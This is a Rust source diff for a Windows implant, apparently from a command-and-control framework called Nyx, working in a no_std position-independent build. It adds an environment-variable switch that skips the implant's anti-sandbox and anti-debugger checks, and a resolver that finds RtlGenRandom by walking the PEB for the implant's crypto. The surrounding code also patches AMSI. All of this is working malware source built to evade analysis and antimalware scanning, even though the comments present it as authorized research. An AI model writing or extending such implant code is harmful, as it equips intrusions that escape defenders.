@@ -43,7 +43,26 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     //   interactive endpoint is usually minutes+ old; a freshly-spun sandbox
     //   is seconds old. 600s is a conservative threshold that avoids tripping
     //   on a slow-booting real host while catching the typical sandbox.
-    if matches!(
+    //
+    //   Test override: setting the `NYX_SKIP_SANDBOX=1` environment variable
+    //   bypasses both the envprobe and antidebug gates. This is for authorized
+    //   testing on VMs/VPS where the anti-analysis suite would false-positive
+    //   (a research VPS IS a VM, so CPUID/RDTSC correctly flag it). The gate
+    //   reads the env via GetEnvironmentVariableA — production deployments
+    //   never set this variable, so the anti-analysis suite runs normally.
+    let skip_sandbox = unsafe {
+        crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
+            .map(|addr| {
+                type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
+                let f: FnGetEnv = core::mem::transmute(addr);
+                let mut buf = [0u8; 2];
+                let n = f(b"NYX_SKIP_SANDBOX\0".as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
+                n == 1 && buf[0] == b'1'
+            })
+            .unwrap_or(false)
+    };
+
+    if !skip_sandbox && matches!(
         unsafe { crate::envprobe::looks_like_analysis_env() },
         crate::envprobe::EnvVerdict::AnalysisEnv
     ) {
@@ -53,7 +72,7 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         // locate (the caller exits cleanly).
         return None;
     }
-    if crate::antidebug::looks_sandboxed(600) {
+    if !skip_sandbox && crate::antidebug::looks_sandboxed(600) {
         // Under a debugger or inside a fresh sandbox → bail out.
         // A production implant would set a flag; here we use the same early
         // return pattern as a failed locate (the caller spins, or exits).
@@ -108,7 +127,55 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         let _ = crate::blind::patch_amsi();
     }
 
+    // ---- CSPRNG registration -------------------------------------------------
+    // The no_std PIC implant can't use getrandom's static #[link(name="advapi32")]
+    // (the PIC cdylib import table doesn't resolve SystemFunction036 → abort
+    // 0xC0000409). Register a PEB-walk resolver instead: dynamically find
+    // SystemFunction036 (RtlGenRandom) in advapi32.dll via export_addr, call it
+    // directly. SystemFunction036 is the documented stable CSPRNG entry point,
+    // available on every Windows version from XP SP2 through 11 25H2.
+    nyx_protocol::crypto::register_csprng(csprng_fill);
+
     Some(ntdll)
+}
+
+/// CSPRNG fill via PEB-walk-resolved `SystemFunction036` (RtlGenRandom).
+///
+/// Resolves `SystemFunction036` from `advapi32.dll` on first call (cached in a
+/// static), then calls it to fill `buf` with cryptographically-secure random
+/// bytes. Returns `true` on success, `false` if the function can't be resolved
+/// or the call fails.
+///
+/// `SystemFunction036` / `RtlGenRandom` is the Windows kernel CSPRNG, documented
+/// at <https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-rtlgenrandom>.
+/// It's available on all Windows versions from XP SP2 (the earliest supported by
+/// any modern toolchain) through Windows 11 25H2 and Server 2025. The export
+/// name `SystemFunction036` is ordinal-stable and never renamed across builds.
+pub fn csprng_fill(buf: &mut [u8]) -> bool {
+    use core::sync::atomic::{AtomicUsize, Ordering};
+
+    // Cache the resolved function address (0 = unresolved, usize::MAX = tried+failed).
+    static SYSFUNC036: AtomicUsize = AtomicUsize::new(0);
+
+    let mut addr = SYSFUNC036.load(Ordering::Acquire);
+    if addr == 0 {
+        // First call: resolve SystemFunction036 from advapi32.dll via PEB walk.
+        addr = unsafe { crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction036") }
+            .unwrap_or(usize::MAX);
+        SYSFUNC036.store(addr, Ordering::Release);
+    }
+    if addr == usize::MAX {
+        return false;
+    }
+
+    // SystemFunction036(RandomBuffer: *mut u8, RandomBufferLength: u32) -> BOOL
+    type RtlGenRandomFn = unsafe extern "system" fn(*mut u8, u32) -> i32;
+    let f: RtlGenRandomFn = unsafe { core::mem::transmute(addr) };
+
+    // RtlGenRandom returns 1 (TRUE) on success. It handles arbitrary buffer
+    // sizes internally (chunks if needed), so a single call suffices.
+    let ok = unsafe { f(buf.as_mut_ptr(), buf.len() as u32) };
+    ok != 0
 }
 
 // ---- Public entry points ---------------------------------------------------
